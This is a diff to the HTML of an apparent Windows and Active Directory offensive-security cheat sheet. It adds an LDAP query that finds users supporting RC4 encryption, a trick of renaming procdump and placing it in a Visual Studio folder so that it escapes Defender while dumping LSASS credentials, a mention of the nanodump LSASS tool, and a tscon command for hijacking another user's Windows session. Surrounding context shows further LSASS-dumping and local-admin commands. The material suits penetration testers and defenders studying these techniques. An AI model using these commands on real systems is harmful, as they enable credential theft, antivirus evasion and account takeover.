@@ -92,6 +92,8 @@
     
         <li><a class="" href="#truster-account">Truster Account</a></li>
     
+        <li><a class="" href="#user-by-supported-encryption-types">User by Supported Encryption Types</a></li>
+    
         <li><a class="" href="#user-enumeration">User enumeration</a></li>
     
     </ul>
@@ -133,6 +135,8 @@
         <li><a class="" href="#tcp-dump-with-netsh">TCP dump with netsh</a></li>
     
         <li><a class="" href="#add-user-to-local-admin">Add user to local admin</a></li>
+    
+        <li><a class="" href="#hijack-windows-session">Hijack Windows session</a></li>
     
         <li><a class="" href="#extract-microsoft-update-files">Extract Microsoft Update files</a></li>
     
@@ -374,6 +378,10 @@
                     
     <a class="section-link" href="../node/">Node</a>
                 </li>
+                <li class="">
+                    
+    <a class="section-link" href="../javascript/">Javascript</a>
+                </li>
     </ul>
           </li>
           
@@ -381,6 +389,10 @@
             
     <span class="section-link ">Misc</span>
     <ul>
+                <li class="">
+                    
+    <a class="section-link" href="../chrome/">Chrome</a>
+                </li>
                 <li class="">
                     
     <a class="section-link" href="../firefox/">Firefox</a>
@@ -539,6 +551,46 @@ You can also run the process manually.</p>
 <div class="clipboard-content">  <pre><code class="language-none">sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
 </code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
 ">    Copy  </button></div></div>
+<h3 id="user-by-supported-encryption-types">User by Supported Encryption Types</h3>
+<p>The attribut <code>msDS-SupportedEncryptionTypes</code> containes the supported encryption
+types for an object. It's possible the search for users that support <code>RC4</code>
+encryption:</p>
+<div class="clipboard-content">  <pre><code class="language-powershell">$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(ObjectClass=User)(ObjectCategory=Person)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.804:=4))&quot;)).FindAll()
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(ObjectClass=User)(ObjectCategory=Person)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.804:=4))&quot;)).FindAll()
+">    Copy  </button></div></div>
+<p>The data is a 32-bits unsigned in little-endian format that contains a bitwise
+of the following flags: </p>
+<table>
+<thead>
+<tr>
+<th align="center">Value</th>
+<th align="center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td align="center">DES-CBC-CRC</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">DES-CBC-MD5</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">RC4-HMAC</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td align="center">AES128-CTS-HMAC-SHA1-96</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td align="center">AES256-CTS-HMAC-SHA1-96</td>
+</tr>
+</tbody>
+</table>
+<p>Source: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919" target="_blank">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919</a></p>
 <h3 id="user-enumeration">User enumeration</h3>
 <h4 id="ldap-search">LDAP search</h4>
 <p>Here is two queries to fetch informations of a domain controller using LDAP:</p>
@@ -577,12 +629,16 @@ and the protection (<a href="https://support.microsoft.com/en-us/help/2962486/ms
 <li>Mimikatz</li>
 <li><a href="https://github.com/Hackndo/lsassy" target="_blank">lsassy</a></li>
 <li><a href="https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/" target="_blank">Silent Process Exit mechanism</a></li>
+<li><a href="https://github.com/helpsystems/nanodump" target="_blank">nanodump</a></li>
 </ul>
 <p>To prevent an Administrator to dump <code>lsass</code> you can enable <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection" target="_blank">LSA Protection (<code>RunAsPPL</code>)</a>.</p>
 <h4 id="procdump">Procdump</h4>
 <div class="clipboard-content">  <pre><code class="language-bash">procdump -accepteula -ma lsass.exe lsass.dmp
 </code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="procdump -accepteula -ma lsass.exe lsass.dmp
 ">    Copy  </button></div></div>
+<p>If you rename procdump.exe to dump64.exe and place it in the
+<code>C:\Program Files (x86)\Microsoft Visual Studio\*</code> folder, you can bypass 
+Defender and dump LSASS.</p>
 <h4 id="rundll32-comsvcsdll">Rundll32 &amp; comsvcs.dll</h4>
 <p>You need to get the PID of <code>lsass</code> before dumping it.</p>
 <div class="clipboard-content">  <pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
@@ -751,6 +807,15 @@ net localgroup Administrators &lt;username&gt; /add
 net user &lt;username&gt; &lt;password&gt; /add
 # add user to local admin group, if the user is from a domain then use &lt;domain&gt;\&lt;username&gt;
 net localgroup Administrators &lt;username&gt; /add
+">    Copy  </button></div></div>
+<h3 id="hijack-windows-session">Hijack Windows session</h3>
+<p>As a <code>SYSTEM</code> user, enumerate sessions with </p>
+<div class="clipboard-content">  <pre><code class="language-powershell">query user
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="query user
+">    Copy  </button></div></div>
+<p>Then use the following command to hijack a user session: </p>
+<div class="clipboard-content">  <pre><code class="language-powershell">cmd /k tscon 2 /dest:console
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="cmd /k tscon 2 /dest:console
 ">    Copy  </button></div></div>
 <h3 id="extract-microsoft-update-files">Extract Microsoft Update files</h3>
 <p>A Windows Update is a <code>.msu</code> archive that contains a <code>.cab</code> archive. This file
